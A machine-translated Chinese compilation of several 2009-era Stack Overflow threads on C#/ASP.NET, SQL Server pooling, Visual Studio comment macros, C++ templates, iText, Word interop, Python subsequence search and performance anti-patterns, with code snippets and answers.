# c# - 如何使用基于 LINQ 的模型管理数百个“形状”

> ID：425544
> 
> 赞同：0
> 
> 时间：2009-01-08T19:28:40.097
> 
> 标签：c#, asp.net, linq-to-sql

我有一个相对适中的数据集（可能有 20 个主表），但它的查询方式很多。

有时我们会展示产品。有时是带有图片的产品。有时是带有图片和评论的产品。有时一个产品带有它的图片以及所有拥有该产品*及其*图片的用户。

等（以及“等”我的意思是“更多排列”）

LINQ 具有确保我们的查询通过 DataLoadOptions 获取所有必要信息的工具。但是，如果您想做诸如“只给我看 5 条评论”之类的事情，您现在正在使用 DataLoadOptions 上的 AssociateWith 方法，现在（在我看来）该方法非常靠近数据库以暴露给例如 codebeside 中的文件您的 ASPX 页面。

所以 - 我很好奇人们是如何处理这个问题的？他们真的用 GetProductsWithPicturesAndUsersAndUserComments(int commentLimit, int pictureSize...

...每一个排列？特别是来自 Rails 背景，他们发现了这一点，这个解决方案看起来非常难看。所以，我希望还有别的东西。想知道别人的经历是什么。

谢谢！汤姆

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-08T19:38:04.647

好吧，LINQ 的重点是您可以自己编写这些类型的查询。只要您将模型映射到数据库正确，您就可以在代码中查询表的表示形式，然后使用 Take 组合该查询，它将获取前 n 行。

# c# - GridView 中的 asp:CheckBoxField - VS 2008

> ID：425548
> 
> 赞同：2
> 
> 时间：2009-01-08T19:29:32.560
> 
> 标签：c#, asp.net

我有一个绑定到对象数据源的 gridview 控件。除了我要显示的列之外，我还想显示这个

```
 <Columns>
         <asp:CheckBoxField DataField="Locked" Visible="true" AccessibleHeaderText="On Hold" ReadOnly="false"/>
 </Columns> 
```

这里有几个问题： 1\. 如果我执行上述操作，根据数据，我的页面加载和某些行的记录标记为已检查，而某些行没有。但是，用户无法单击任何记录来撤消其复选标记。这似乎处于禁用状态。

2.  此复选框字段似乎没有 onclick 事件。当用户选中或取消选中每条记录时，我想立即更新我的记录。是的，这里的设计很糟糕，但我的双手被束缚

3.  如果我要`<asp:checkbox>`在`<itemtemplate>`我如何将其绑定到对象数据源中的锁定列，或者我是否必须通过覆盖 gridview 控件的方法来做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-09T02:37:19.233

要回答 #2，我会在 中使用`<asp:CheckBox>`控件，`<ItemTemplate>`然后在事件中设置`Checked`属性：`GridView_RowDataBound`

```
protected void grdSomething_RowDataBound ( Object sender, GridViewRowEventArgs e )
{
    if ( e.Row.RowType == DataControlRowType.DataRow )
    {
        BusinessObject data = ( BusinessObject ) e.Row.DataItem;
        CheckBox chkLocked = ( CheckBox ) e.Row.FindControl( "chkLocked" );
        chkLocked.Checked = data.Locked;
    }
} 
```

至于问题 #1，我过去使用的一个效果很好的解决方案是让调用的客户端`onClick`事件`<asp:CheckBox>`更新相应的业务的 ASP.NET Ajax 异步页面方法（本质上是私有 Web 服务）目的。这对您来说不是最简单的方法，但用户体验非常流畅（即没有整页回发）：

您需要在代码隐藏文件中使用静态方法来更新相应的业务对象。类似的东西（这很粗糙）：

```
[WebMethod]
public static void ToggleLockedStatus ( string key )
{
    if ( BusinessObjectDictionary.ContainsKey( key ) )
    {
        BusinessObjectDictionary[ key ].Locked = !BusinessObjectDictionary[ key ].Locked;
    }
    else
    {
        throw new Exception( "The business object specified was not found." );
    }
} 
```

有关如何使用 ASP.NET Ajax 执行此操作的详细信息，[请在此处查看 MSDN](http://msdn.microsoft.com/en-us/library/bb398995.aspx)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T20:50:56.637

您的控件已锁定，因为 GridView 仅允许您在该行处于编辑模式时编辑该行。我认为您真正要寻找的是在 TemplateField 中定义的复选框。然后，您可以在后面的代码中设置初始“已检查”值，也可以执行以下操作：

```
<asp:CheckBox ID="MyCheckBox" runat="server" Checked='<%#Eval("Locked")' ... /> 
```

至于触发器，您可以将 OnCheckedChange 属性指向您选择的函数，但我不确定您如何告诉它检查了哪一行。

更好的选择可能是使用 Button 或 ImageButton 控件来做同样的事情。这样，您可以使用行 ID 或您需要的任何内容填充 CommandArgument，并且在处理 GridView 的 RowCommand 时可以访问它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T19:44:06.460

对于点击事件，我也无法弄清楚 OnClickChange，所以我自己动手。

```
using System;
using System.Collections.Generic;
using System.Text;
using System.Linq;
using System.Data.Linq;
using System.Data.Linq.Mapping;
using System.Web;
using System.Web.UI.WebControls;

namespace Web.Library.Controls.Commands
{
    public class CommandCheckBox : System.Web.UI.WebControls.CheckBox
    {
        private static readonly object EventCommand = new object();

        public event CommandEventHandler Command
        {
            add
            {
                Events.AddHandler(EventCommand, value);
            }
            remove
            {
                Events.RemoveHandler(EventCommand, value);
            }
        }

        public string CommandName
        {
            get
            {
                if (this.ViewState["CommandName"] == null)
                    return string.Empty;

                return (string)this.ViewState["CommandName"];
            }
            set { this.ViewState["CommandName"] = value; }
        }

        public string CommandArgument
        {
            get
            {
                if (this.ViewState["CommandArgument"] == null)
                    return string.Empty;

                return (string)this.ViewState["CommandArgument"];
            }
            set { this.ViewState["CommandArgument"] = value; }
        }

        protected virtual void OnCommand(CommandEventArgs args)
        {
            CommandEventHandler commandEventHand = Events[EventCommand] as CommandEventHandler;

            if (commandEventHand != null)
            {
                commandEventHand(this, args);
            }

            base.RaiseBubbleEvent(this, args);
        }

        protected override void OnCheckedChanged(EventArgs e)
        {
            base.OnCheckedChanged(e);

            CommandEventArgs args = new CommandEventArgs(this.CommandName, this.CommandArgument);

            this.OnCommand(args);
        }

        public CommandCheckBox()
        {
        }

    }
} 
```

至于数据绑定和更新，我只是在 GridRowCommand 上自己处理。

# .net - 连接池在 .Net SQL Server 2008 中不起作用

> ID：425558
> 
> 赞同：0
> 
> 时间：2009-01-08T19:32:11.900
> 
> 标签：.net, sql-server-2008, connection-pooling

我正在测试我的应用程序，希望能迁移到 SQL Server 2008（从 200 开始）。在 SQL Server 探查器中，我看到

```
    审核登录
    SQL：批处理开始选择......
    SQL：批量完成选择......
    审核注销

```

对于正在运行的每个查询。据我所知，这意味着它为我运行的每个查询创建一个新连接，而不是使用连接池。是这样吗？如果是，我能做些什么来解决为什么连接池不起作用。我使用单个常量字符串作为连接字符串，并且我总是在完成后立即关闭（将其释放回池）连接。我的连接字符串没有禁用池，最小池大小为 10，最大池大小为 1000。

有没有其他人遇到过类似的问题？以防万一，它是在 XP Professional（我的开发箱）上运行的 ASP.NET 应用程序 (VB.NET)。我已经编译了针对 .NET 2 框架的 Web 应用程序。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-08T19:35:47.320

这是预期的行为。从[Audit Login Event Class](http://msdn.microsoft.com/en-us/library/ms190260.aspx)的文档中：

Audit Login 事件类表明用户已成功登录到 Microsoft SQL Server。此类中的事件由新连接或从连接池中重用的连接触发。

您应该查看适当的连接性能计数器，以了解您真正拥有的连接数（在客户端和服务器上）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T19:58:32.970

要回答您的问题，否。这种行为并不意味着您的连接没有被合并。正如 casper 所解释的，即使重用池连接，您也会看到这些事件。

# vb.net - 如何在 Visual Studio 中自定义自动注释文本？

> ID：425559
> 
> 赞同：10
> 
> 时间：2009-01-08T19:32:30.383
> 
> 标签：vb.net, visual-studio, xml-comments, autocommenting

当我在 Visual Studio 中键入触发自动注释功能时（通过键入“'''”或“///”），大多数 XML 注释细节都会显示我喜欢的。但是，我通常将历史标记添加到文档中，以便我可以跟踪和随时间对方法所做的更改。

有什么方法可以自定义自动评论功能，以便添加历史标签，并可能添加一些通用名称 - 日期 - 更改占位符文本？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-01-08T19:44:30.080

我建议使用[GhostDoc](http://www.roland-weigelt.de/ghostdoc/)。它会根据您的方法名称和参数使用 /// 生成非常智能的注释。此外，它是完全可定制的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-08T20:54:32.747

我认为您可以使用 dgarcia 所说的工具，但尝试选择一个使版本控制 insetad 的工具，就我个人而言，我不太喜欢使用代码中的注释来保持“历史”或跟踪项目。

如果您喜欢这种方式，您可以创建自己的自定义版本的代码片段，如果您使用像[Snippy这样的工具，这会更容易](http://www.codeplex.com/snippy)

[将此文件复制](http://cid-f51308314f996beb.skydrive.live.com/self.aspx/P%c3%bablico/CustomizedComments.snippet)到您的

我的文档\Visual Studio 2005\代码片段[语言]\我的代码片段\

如果您要在 VB.NET 中使用它，请小心更改文件

希望这有帮助

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T22:40:28.087

就像对 Olivier 的评论的跟进一样。现在这是宏的副本，查找“执行历史记录”部分以查看我插入代码的位置。

```
 ''// InsertDocComments goes through the current document using the VS Code Model
    ''// to add documentation style comments to each function.
    ''
    Sub InsertDocComments()
        Dim projectItem As ProjectItem
        Dim fileCodeModel As FileCodeModel
        Dim codeElement As CodeElement
        Dim codeElementType As CodeType
        Dim editPoint As EditPoint
        Dim commentStart As String

        projectItem = DTE.ActiveDocument.ProjectItem
        fileCodeModel = projectItem.FileCodeModel
        codeElement = fileCodeModel.CodeElements.Item(1)

        ''// For the sample, don't bother recursively descending all code like
        ''// the OutlineCode sample does. Just get a first CodeType in the
        ''// file.
        If (TypeOf codeElement Is CodeNamespace) Then
            codeElement = codeElement.members.item(1)
        End If
        If (TypeOf codeElement Is CodeType) Then
            codeElementType = CType(codeElement, CodeType)
        Else
            Throw New Exception("Didn't find a type definition as first thing in file or find a namespace as the first thing with a type inside the namespace.")
        End If

        editPoint = codeElementType.GetStartPoint(vsCMPart.vsCMPartHeader).CreateEditPoint()

        ''// Make doc comment start.
        commentStart = LineOrientedCommentStart()
        If (commentStart.Length = 2) Then
            commentStart = commentStart & commentStart.Chars(1) & " "
        ElseIf (commentStart.Length = 1) Then
            commentStart = commentStart & commentStart.Chars(0) & commentStart.Chars(0) & " "
        End If

        ''// Make this atomically undo'able.  Use Try...Finally to ensure Undo
        ''// Context is close.
        Try
            DTE.UndoContext.Open("Insert Doc Comments")

            ''// Iterate over code elements emitting doc comments for functions.
            For Each codeElement In codeElementType.Members
                If (codeElement.Kind = vsCMElement.vsCMElementFunction) Then
                    ''// Get Params.
                    Dim parameters As CodeElements
                    Dim codeFunction As CodeFunction
                    Dim codeElement2 As CodeElement
                    Dim codeParameter As CodeParameter

                    codeFunction = codeElement
                    editPoint.MoveToPoint(codeFunction.GetStartPoint(vsCMPart.vsCMPartHeader))
                    ''//editPoint.LineUp()
                    parameters = codeFunction.Parameters

                    ''// Do comment.
                    editPoint.Insert(Microsoft.VisualBasic.Constants.vbCrLf)
                    editPoint.LineUp()
                    editPoint.Insert(Microsoft.VisualBasic.Constants.vbTab & commentStart & "<summary>")
                    editPoint.Insert(Microsoft.VisualBasic.Constants.vbCrLf)
                    editPoint.Insert(Microsoft.VisualBasic.Constants.vbTab & commentStart & "Summary of " & codeElement.Name & ".")
                    editPoint.Insert(Microsoft.VisualBasic.Constants.vbCrLf)
                    editPoint.Insert(Microsoft.VisualBasic.Constants.vbTab & commentStart & "</summary>")
                    editPoint.Insert(Microsoft.VisualBasic.Constants.vbCrLf)
                    editPoint.Insert(Microsoft.VisualBasic.Constants.vbTab & commentStart)

                    For Each codeElement2 In parameters
                        codeParameter = codeElement2
                        editPoint.Insert("<param name=" & codeParameter.Name & "></param>")
                        editPoint.Insert(Microsoft.VisualBasic.Constants.vbCrLf)
                        editPoint.Insert(Microsoft.VisualBasic.Constants.vbTab & commentStart)
                    Next ''//param

                    ''// Do history tag.
                    editPoint.Insert(Microsoft.VisualBasic.Constants.vbCrLf)
                    editPoint.LineUp()
                    editPoint.Insert(Microsoft.VisualBasic.Constants.vbTab & commentStart & "<history>")
                    editPoint.Insert(Microsoft.VisualBasic.Constants.vbCrLf)
                    editPoint.Insert(Microsoft.VisualBasic.Constants.vbTab & commentStart & "Name   MM/DD/YYYY   [Created]")
                    editPoint.Insert(Microsoft.VisualBasic.Constants.vbCrLf)
                    editPoint.Insert(Microsoft.VisualBasic.Constants.vbTab & commentStart & "</history>")
                    editPoint.Insert(Microsoft.VisualBasic.Constants.vbCrLf)
                    editPoint.Insert(Microsoft.VisualBasic.Constants.vbTab & commentStart)

                End If ''//we have a function
            Next ''//code elt member

        Finally
            DTE.UndoContext.Close()
        End Try
    End Sub 
```

出于某种原因，在保存、重建和重新启动 Visual Studio 之后，我没有得到历史标记。有人可以在这里看到我缺少的东西吗？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2011-04-15T20:48:08.267

vb 使用 xml 文件来加载 defults。它是 VBXMLDoc.xml，它取决于您正在运行的版本以及文件的位置。

# asp.net-mvc - 最新的 ASP.NET MVC 位在哪里？

> ID：425574
> 
> 赞同：1
> 
> 时间：2009-01-08T19:37:21.297
> 
> 标签：asp.net-mvc

MVC 的最新版本是 Preview 5 版本吗？我已经离开了一段时间，只是想确保我拥有最新最好的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-08T19:40:36.420

这里是像这样的下载：[Microsoft ASP.NET MVC Beta](http://www.microsoft.com/downloads/details.aspx?FamilyId=A24D1E00-CD35-4F66-BAA0-2362BDDE0766&displaylang=en)

主站点是[www.asp.net/mvc](http://www.asp.net/mvc)

源代码在这里：[www.codeplex.com/aspnet](http://www.codeplex.com/aspnet)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2009-01-08T19:47:22.693

由于候选版本即将发布（无论这意味着什么），您可能希望在进行新安装之前推迟。看一些视频，读一些文章......

或者去获取测试版并潜入...

# c++ - 具有 VARIANT 返回类型的模板实例化

> ID：425576
> 
> 赞同：3
> 
> 时间：2009-01-08T19:38:33.820
> 
> 标签：c++, templates

静态模板成员函数的显式实例化一直无法与消息一起编译`error C2785: 'at_Intermediate CUtil::convert_variant(const VARIANT &)' and '<Unknown>' have different return types`

当我用非静态成员函数制作相应的类时，编译器喜欢我。

```
// utility class - static methods
struct CUtil {
      template< typename at_Intermediate > static at_Intermediate convert_variant( const VARIANT &v ) ;

      template<> static VARIANT convert_variant<VARIANT >( const VARIANT &v ) { return v; } // 
      template<> static double  convert_variant<double  >( const VARIANT &v ) { return v.dblVal; }
      template<> static long    convert_variant<long    >( const VARIANT &v ) { return v.lVal  ; }
      template<> static BSTR    convert_variant<BSTR    >( const VARIANT &v ) { return v.bstrVal; }
}; 
```

这是一个组合问题：

1.  为什么编译器在明确知道函数“Unknown”时会抱怨它？

2.  触发此消息的原因 - 当函数设为全局或非静态时它会消失。

编辑：

在 Josh 提供了一些有用的提示后：是否不允许在类声明中显式实例化模板函数？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-08T20:02:57.467

试试这种方式：

```
struct CUtil {
    template< typename T > 
    static T convert_variant(const VARIANT &);
};

template<> int CUtil::convert_variant<int>(const VARIANT &);
template<> VARIANT CUtil::convert_variant<VARIANT>(const VARIANT &); 
```

您不能在类范围内明确专门化模板。 [见这里](http://msdn.microsoft.com/en-us/library/8zft3014.aspx)。

VS2008 的奇怪问题是它确实有效。

```
struct CUtil {
    template< typename T > 
    static T convert_variant(const VARIANT &);
    template<> 
    static int convert_variant<int>(const VARIANT &);
}; 
```

还有这个：

```
struct CUtil {
    template< typename T > static void convert_variant(T);
    template<> static void convert_variant<VARIANT >(VARIANT);
}; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-08T20:15:49.313

Apparently you may only use explicit template specialization at namespace scope although I can't find this in the standard (but GCC says as much). The following works for me (on GCC):

```
struct CUtil {
    template< typename at_Intermediate > static at_Intermediate convert_variant( const VARIANT &v ) ;
};

template<> VARIANT CUtil::convert_variant<VARIANT >( const VARIANT &v ) { return v; }
template<> double  CUtil::convert_variant<double  >( const VARIANT &v ) { return v.dblVal; }
template<> long    CUtil::convert_variant<long    >( const VARIANT &v ) { return v.lVal  ; }
template<> BSTR    CUtil::convert_variant<BSTR    >( const VARIANT &v ) { return v.bstrVal; } 
```

**EDIT** It *is* in the standard:

14.7.2.5:

> An explicit instantiation of a class or function template specialization is placed in the namespace in which the template is defined. An explicit instantiation for a member of a class template is placed in the namespace where the enclosing class is defined. *An explicit instantiation for a **member template** is placed in the namespace where the enclosing class or class template is defined.*

(All emphasis added by me.)

# java - 如何使用 iText 将 Swing 组件绘制到 PDF 文件？

> ID：425590
> 
> 赞同：5
> 
> 时间：2009-01-08T19:42:02.783
> 
> 标签：java, swing, pdf, pdf-generation, itext

我想通过 iText 将我的 Swing JComponent 打印为 pdf。

```
JComponent com = new JPanel();
com.add( new JLabel("hello") );

PdfWriter writer = PdfWriter.getInstance( document, new FileOutputStream( dFile ) );
document.open( );

PdfContentByte cb = writer.getDirectContent( );
PdfTemplate tp = cb.createTemplate( pageImageableWidth, pageImageableHeight );
Graphics2D g2d = tp.createGraphics( pageImageableWidth, pageImageableHeight, new DefaultFontMapper( ) );
g2d.translate( pf.getImageableX( ), pf.getImageableY( ) );
g2d.scale( 0.4d, 0.4d );
com.paint( g2d );
cb.addTemplate( tp, 25, 200 );
g2d.dispose( ); 
```

不幸的是，PDF 文件中没有显示任何内容。你知道如何解决这个问题吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-10T09:29:53.150

我已经弄清楚添加 addNotify 和 validate 帮助。

```
    com.addNotify();
    com.validate();

```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-20T15:21:45.367

我需要打电话

```
com.addNotify()
com.setSize()
com.validate() 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T19:59:52.967

我对 iText 了解不多，但是...您确实`PdfWriter`在某个时候关闭了，对吗？

# c# - 以编程方式调整字体大小以适合 Word 中文本框内的文本

> ID：425593
> 
> 赞同：1
> 
> 时间：2009-01-08T19:42:36.683
> 
> 标签：c#, ms-word, ms-office, office-interop

我的一个应用程序处理 MS Word 和文档创建/编辑/格式化。我正在使用带有 VS 2008 的 Office 2007，并且我正在针对 Microsoft.Office.Interop.Word 库进行编码，该库似乎适用于 2003 或 2008。

我使用 Document.Shapes.AddTextbox 方法在文档中创建一个文本框，然后用文本填充它。我希望能够以编程方式确定文本是否适合文本框，如果不适合，则减小字体大小直到适合。

我尝试了几种不同的方法：

1) 使用 bool Shape.TextFrame.Overflowing 属性

```
while (textbox.TextFrame.Overflowing) // adjust font size 
```

但是，即使当我打开文档时我可以看到文本适合框，这也会返回 TRUE。

2) 检查文本最后一个字符的 X/Y 位置，并查看该坐标是否在文本框边界内

```
lastCharX = System.Convert.ToSingle (tb.TextFrame.TextRange.Characters.Last.get_Information (WdInformation.wdHorizontalPositionRelativeToPage));
lastCharY = System.Convert.ToSingle (tb.TextFrame.TextRange.Characters.Last.get_Information (WdInformation.wdVerticalPositionRelativeToPage));
bool outsideFrameBoundaries = lastCharX + lastCharWidth > frameBoundaryX || lastCharY + lastCharHeight > frameBoundaryY; 
```

但是，这会返回几乎总是在框内的 X/Y，尽管当我打开文档时我看不到该字符，因为它不适合框。

所以我的想法已经用完了，我想问其他人以前是否经历过这个问题，以及他们是否对处理互操作这个词的不准确混乱有任何建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-08T21:50:47.517

我想出了一个解决方案。

当我想出一种方法来解决 Word 的疯狂时，它就开始了。当我获得一个字符的 X/Y 坐标，并且该字符存在于文本框区域之外时，Word 实际上会返回正确的 X 值，但 Y 值是文本框上最后一个可见行的 Y 值。

所以我从末尾开始扫描所有字符，如果我发现重复的坐标，那么我知道有溢出。我还必须检查 Y 值 + 字体大小是否大于文本框的底部边界。但这对于检测文本框是否溢出似乎非常可靠（如果速度很慢）。一旦我确定它是否溢出，我就会不断减小字体大小，直到没有。

# python - 确定一个序列是否在另一个序列中的最佳方法？

> ID：425604
> 
> 赞同：30
> 
> 时间：2009-01-08T19:46:10.483
> 
> 标签：python, algorithm, sequence

这是将“字符串包含子字符串”问题推广到（更多）任意类型。

给定一个序列（例如列表或元组），确定另一个序列是否在其中的最佳方法是什么？作为奖励，它应该返回子序列开始的元素的索引：

示例用法（Sequence in Sequence）：

```
>>> seq_in_seq([5,6],  [4,'a',3,5,6])
3
>>> seq_in_seq([5,7],  [4,'a',3,5,6])
-1 # or None, or whatever 
```

到目前为止，我只是依靠蛮力，它看起来缓慢、丑陋和笨拙。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2009-01-08T20:42:46.140

我支持 Knuth-Morris-Pratt 算法。顺便说一句，您的问题（和 KMP 解决方案）正是[Python Cookbook](https://rads.stackoverflow.com/amzn/click/com/0596007973)第 2 版中的配方 5.13。[您可以在http://code.activestate.com/recipes/117214/](http://code.activestate.com/recipes/117214/)找到相关代码

它在给定序列中找到*所有*正确的子序列，并且应该用作迭代器：

```
>>> for s in KnuthMorrisPratt([4,'a',3,5,6], [5,6]): print s
3
>>> for s in KnuthMorrisPratt([4,'a',3,5,6], [5,7]): print s
(nothing) 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2009-01-08T21:55:59.470

这是一种蛮力方法`O(n*m)`（类似于[@mcella 的答案](https://stackoverflow.com/questions/425604/best-way-to-determine-if-a-sequence-is-in-another-sequence-in-python#425764)）。*对于小*输入序列，它可能比纯 Python 中的 Knuth-Morris-Pratt 算法实现更快`O(n+m)`（请参阅[@Gregg Lind 答案](https://stackoverflow.com/questions/425604/best-way-to-determine-if-a-sequence-is-in-another-sequence-in-python#425838)） 。

 *```
#!/usr/bin/env python
def index(subseq, seq):
    """Return an index of `subseq`uence in the `seq`uence.

    Or `-1` if `subseq` is not a subsequence of the `seq`.

    The time complexity of the algorithm is O(n*m), where

        n, m = len(seq), len(subseq)

    >>> index([1,2], range(5))
    1
    >>> index(range(1, 6), range(5))
    -1
    >>> index(range(5), range(5))
    0
    >>> index([1,2], [0, 1, 0, 1, 2])
    3
    """
    i, n, m = -1, len(seq), len(subseq)
    try:
        while True:
            i = seq.index(subseq[0], i + 1, n - m + 1)
            if subseq == seq[i:i + m]:
               return i
    except ValueError:
        return -1

if __name__ == '__main__':
    import doctest; doctest.testmod() 
```

*我想知道在这种情况下小*有多大？

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2015-04-03T00:07:40.433

一个简单的方法：转换为字符串并依赖字符串匹配。

使用字符串列表的示例：

```
 >>> f = ["foo", "bar", "baz"]
 >>> g = ["foo", "bar"]
 >>> ff = str(f).strip("[]")
 >>> gg = str(g).strip("[]")
 >>> gg in ff
 True 
```

使用字符串元组的示例：

```
>>> x = ("foo", "bar", "baz")
>>> y = ("bar", "baz")
>>> xx = str(x).strip("()")
>>> yy = str(y).strip("()")
>>> yy in xx
True 
```

使用数字列表的示例：

```
>>> f = [1 , 2, 3, 4, 5, 6, 7]
>>> g = [4, 5, 6]
>>> ff = str(f).strip("[]")
>>> gg = str(g).strip("[]")
>>> gg in ff
True 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2009-01-08T20:05:09.397

与字符串匹配先生相同... [Knuth-Morris-Pratt 字符串匹配](http://www.ics.uci.edu/~eppstein/161/960227.html)

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2009-01-08T20:26:54.223

```
>>> def seq_in_seq(subseq, seq):
...     while subseq[0] in seq:
...         index = seq.index(subseq[0])
...         if subseq == seq[index:index + len(subseq)]:
...             return index
...         else:
...             seq = seq[index + 1:]
...     else:
...         return -1
... 
>>> seq_in_seq([5,6], [4,'a',3,5,6])
3
>>> seq_in_seq([5,7], [4,'a',3,5,6])
-1 
```

抱歉，我不是算法专家，这只是我目前能想到的最快的事情，至少我认为它（对我来说）看起来不错，而且我在编写它时玩得很开心。;-)

很可能这与您的蛮力方法正在做的事情相同。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-01-08T19:51:19.207

蛮力可能适用于小图案。

对于较大的，请查看[Aho-Corasick 算法](http://en.wikipedia.org/wiki/Aho-Corasick_algorithm)。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-01-08T20:44:55.997

这是另一个 KMP 实现：

```
from itertools import tee

def seq_in_seq(seq1,seq2):
    '''
    Return the index where seq1 appears in seq2, or -1 if 
    seq1 is not in seq2, using the Knuth-Morris-Pratt algorithm

    based heavily on code by Neale Pickett <neale@woozle.org>
    found at:  woozle.org/~neale/src/python/kmp.py

    >>> seq_in_seq(range(3),range(5))
    0
    >>> seq_in_seq(range(3)[-1:],range(5))
    2
    >>>seq_in_seq(range(6),range(5))
    -1
    '''
    def compute_prefix_function(p):
        m = len(p)
        pi = [0] * m
        k = 0
        for q in xrange(1, m):
            while k > 0 and p[k] != p[q]:
                k = pi[k - 1]
            if p[k] == p[q]:
                k = k + 1
            pi[q] = k
        return pi

    t,p = list(tee(seq2)[0]), list(tee(seq1)[0])
    m,n = len(p),len(t)
    pi = compute_prefix_function(p)
    q = 0
    for i in range(n):
        while q > 0 and p[q] != t[i]:
            q = pi[q - 1]
        if p[q] == t[i]:
            q = q + 1
        if q == m:
            return i - m + 1
    return -1 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2016-10-27T20:21:49.403

我参加聚会有点晚了，但这里有一些使用字符串的简单方法：

```
>>> def seq_in_seq(sub, full):
...     f = ''.join([repr(d) for d in full]).replace("'", "")
...     s = ''.join([repr(d) for d in sub]).replace("'", "")
...     #return f.find(s) #<-- not reliable for finding indices in all cases
...     return s in f
...
>>> seq_in_seq([5,6], [4,'a',3,5,6])
True
>>> seq_in_seq([5,7], [4,'a',3,5,6])
False
>>> seq_in_seq([4,'abc',33], [4,'abc',33,5,6])
True 
```

正如**Ilya V. Schurov**所指出的，在这种情况下，**find**方法将不会返回具有多字符串或多位数字的正确索引。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2020-12-30T06:46:55.207

对于它的价值，我尝试使用这样的双端队列：

```
from collections import deque
from itertools import islice

def seq_in_seq(needle, haystack):
    """Generator of indices where needle is found in haystack."""
    needle = deque(needle)
    haystack = iter(haystack)  # Works with iterators/streams!
    length = len(needle)
    # Deque will automatically call deque.popleft() after deque.append()
    # with the `maxlen` set equal to the needle length.
    window = deque(islice(haystack, length), maxlen=length)
    if needle == window:
        yield 0  # Match at the start of the haystack.
    for index, value in enumerate(haystack, start=1):
        window.append(value)
        if needle == window:
            yield index 
```

deque 实现的一个优点是它只在 haystack 上进行一次线性传递。因此，如果 haystack 正在流式传输，那么它仍然可以工作（与依赖切片的解决方案不同）。

解决方案仍然是蛮力，O（n * m）。一些简单的本地基准测试表明它比在`str.index`.

* * *

## 回答 #10

> 赞同：-1
> 
> 时间：2015-12-03T06:36:22.003

另一种方法，使用集合：

```
set([5,6])== set([5,6])&set([4,'a',3,5,6])
True 
```

# xaml - 嵌入 .NET 应用程序的 XPS 或 XAML 查看器？

> ID：425605
> 
> 赞同：2
> 
> 时间：2009-01-08T19:46:34.943
> 
> 标签：xaml, xps, xpsviewer

是否有查看器对象或 ActiveX 控件可用于在我的 .NET 应用程序中嵌入 XPS 文档或 XAML GUI？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-30T07:04:30.973

您可以使用[ElementHost 控件](http://msdn.microsoft.com/en-us/library/system.windows.forms.integration.elementhost.aspx)在 .Net Windows 窗体上托管 WPF 内容。ElementHost 出现在工具箱中的 WPF 互操作性部分下。然后，您可以托管一个带有 XPS 文档查看器的 WPF 控件，并且您已经解决了这两个问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-11-19T10:40:22.567

也许这有帮助。 [将 WPF 与 Windows 窗体集成](http://www.codeproject.com/KB/dialog/WinFormWPFIntegration.aspx)

# performance - 性能反模式

> ID：425612
> 
> 赞同：13
> 
> 时间：2009-01-08T19:48:41.880
> 
> 标签：performance, anti-patterns

我目前正在为一个客户工作，他们因为“性能原因”而对更改**糟糕**的不可测试和不可维护的代码感到震惊。很明显，有很多误解普遍存在，原因不被理解，而只是盲目相信。

我遇到的一种这样的反模式是需要将尽可能多的类标记为**密封的内部**......

*重新编辑：我认为将所有内容标记为内部*密封*（在 C# 中）作为过早的优化。*

我想知道人们可能知道或遇到的其他一些性能反模式是什么？

* * *

## 回答 #1

> 赞同：70
> 
> 时间：2009-01-08T19:57:08.930

我遇到的最大的性能反模式是：

*   **不测量**更改前后的性能。

收集性能数据将显示某种技术是否成功。不这样做会导致非常无用的活动，因为当什么都没有改变时，有人会有提高性能的“感觉”。

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2009-01-08T20:21:01.893

房间里的大象： **专注于实现级别的微优化，而不是更好的算法。**

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2009-01-08T19:54:53.507

**可变重用。**

我过去一直这样做，因为我认为我在声明中节省了几个周期并降低了内存占用。与它使代码调试的不规则性相比，这些节省的价值微不足道，尤其是如果我最终移动了一个代码块并且对起始值的假设发生了变化。

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2009-01-08T20:07:18.740

**过早的性能优化**浮现在脑海中。我倾向于不惜一切代价避免性能优化，当我决定我确实需要它们时，我会将问题转给我的同事几轮，以确保我们将模糊...嗯优化放在正确的位置。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2009-01-08T20:56:53.990

我遇到的一个问题是将硬件投入到严重损坏的代码中，以使其足够快，这与 Rulas 评论中提到的 Jeff Atwood 的文章相反。我不是在谈论通过在更快的硬件上运行使用基本的正确算法来加速排序与使用优化算法之间的区别。当标准库中有 O(n log n) 算法时，我说的是使用不明显正确的自制 O(n^3) 算法。还有诸如手动编码例程之类的东西，因为程序员不知道标准库中有什么。那是非常令人沮丧的。

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2009-01-08T21:47:57.413

使用设计模式只是为了使用它们。

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2009-01-08T22:07:55.907

